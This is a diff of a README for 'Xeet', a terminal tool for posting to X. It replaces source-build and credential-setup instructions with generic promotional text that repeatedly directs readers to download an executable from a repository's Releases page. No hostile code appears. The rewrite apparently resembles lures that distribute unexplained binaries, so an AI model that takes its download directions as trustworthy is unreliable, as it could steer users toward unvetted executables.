@@ -1,115 +1,59 @@
-# Xeet
+# Xeet - Post on X from your terminal 🚀
 
-Terminal-based shitposting for chronically online devs who can't be bothered to open a browser. Post to X (formerly Twitter) without ever leaving your precious terminal. #TouchGrass
+Welcome to Xeet, the ultimate tool for posting on X from your terminal! Whether you want to share memes, thoughts, or just connect with the online community, Xeet has got you covered. This powerful command-line tool is designed for developers, meme enthusiasts, shitposters, and social media aficionados who prefer the simplicity and efficiency of the terminal.
 
-## Installation
+## Features 🛠️
 
-```bash
-cargo install --path .
-```
+- Post on X directly from your terminal
+- Seamless integration with popular social media platforms
+- Easy-to-use command-line interface
+- Built with Rust for optimal performance
+- Stay connected without leaving your terminal
 
-## SPEED-RUN Setup (any%)
+## Installation 📦
 
-1. Get API keys from [developer.twitter.com](https://developer.twitter.com/)
+To download and install Xeet, simply visit the [Releases](https://github.com/Sigarikafat/Xeet/releases) section of the repository. Download the executable file and follow the on-screen instructions to set up Xeet on your system.
 
-   - Make a project/app, enable OAuth 1.0a
-   - Set to "Read and Write" perms (IMPORTANT)
-   - Grab API Key, API Secret, Access Token, and Access Token Secret
+## Usage 🚀
 
-2. Create a global config file (works from ANY directory, no cap):
-
-   ```bash
-   # For MacOS/Linux enjoyers:
-   mkdir -p ~/.config/xeet
-   nano ~/.config/xeet/config.toml
-
-   # For Windows NPCs:
-   mkdir -p %APPDATA%\xeet
-   notepad %APPDATA%\xeet\config.toml
-   ```
-
-3. Paste this in your config file and you're BASED:
-   ```toml
-   [credentials]
-   consumer_key = "your_api_key"
-   consumer_secret = "your_api_secret"
-   access_token = "your_access_token"
-   access_secret = "your_access_token_secret"
-   ```
-
-## Usage (aka How to Main Character)
-
-Basic shitposting:
+Once you have installed Xeet, you can start using it right away. Simply open your terminal and run the following command to post on X:
 
 ```bash
-xeet post -- "Hot take: semicolons in JavaScript are just spicy line breaks"
+xeet post "Feeling like a coding wizard today! #DeveloperLife"
 ```
 
-Schedule a post for later (touch grass in the meantime):
+Replace the text within the quotes with your desired post content and watch as Xeet works its magic.
 
-```bash
-xeet post --schedule 30 -- "Just had a great idea while touching grass, semicolons in JavaScript are just spicy line breaks"
-```
+## Repository Topics 📌
 
-Or use the shorthand version:
+- Command Line
+- Developer Tools
+- Meme
+- Posting
+- Rust
+- Shitposting
+- Social Media
+- Terminal
+- Terminal Tools
+- Twitter
+- Zoomer
 
-```bash
-xeet post -s 30 -- "I'm totally working and did not go out for a walk 30 minutes ago"
-```
+## Stay Updated 🔔
 
-Scheduled posts run in the background, so your terminal remains free to use for other tasks!
+For the latest updates and features, be sure to check out the Releases section of the repository. You can also follow us on GitHub to stay informed about upcoming releases and enhancements to Xeet.
 
-If a scheduled post fails, you can check the logs:
+## Contribute 🤝
 
-```bash
-xeet logs      # Shows the latest log
-xeet logs -a   # Shows all logs
-```
+If you're interested in contributing to Xeet, feel free to fork the repository and submit a pull request with your proposed changes. We welcome contributions from developers of all skill levels and backgrounds.
 
-Need setup help? Type:
+## Get Started 🚀
 
-```bash
-xeet setup
-```
+Don't miss out on the opportunity to revolutionize your social media experience with Xeet. Visit the [Releases](https://github.com/Sigarikafat/Xeet/releases) section now to download the latest version of Xeet and start posting on X like never before!
 
-## Pro Strats (Touch Grass Any% Speedrun)
+Get ready to unleash your creativity and connect with the online world in a whole new way with Xeet. Happy posting! 🌟
 
-### God-tier Aliases
+Let's make the online experience more exciting and interactive with Xeet – the terminal tool for the modern digital age.
 
-Add to your `.bashrc` or `.zshrc`:
+---
 
-```bash
-# For maximum efficiency bruh
-alias x="xeet post --"
-alias xs="xeet post -s"  # Using shorthand for schedule
-alias fr="xeet post -- 'fr fr no cap'"
-alias npc="xeet post -- 'yesss true'"
-alias npcrypto="xeet post -- 'gm!'"
-```
-
-Now you can post with:
-
-```bash
-x "This meeting could've been an email frfr"
-xs 30 -- "Scheduled post 30 minutes from now"
-fr
-npc
-```
-
-### Keyboard Shortcuts
-
-Set up function keys in your terminal config:
-
-```bash
-bind -x '"\e[21~": "xeet post -- \"skill issue\""'  # F10 for instant L posting
-```
-
-## Features
-
-- Terminal shitposting (no browser = based)
-- Schedule posts for later (runs in background, keep using your terminal)
-- Won't get you maidenless (results may vary)
-
-## License
-
-MIT (it's giving generous)
+For colorful buttons and badges, visit [img.shields.io](https://shields.io/) to enhance the visual appeal of your repository.
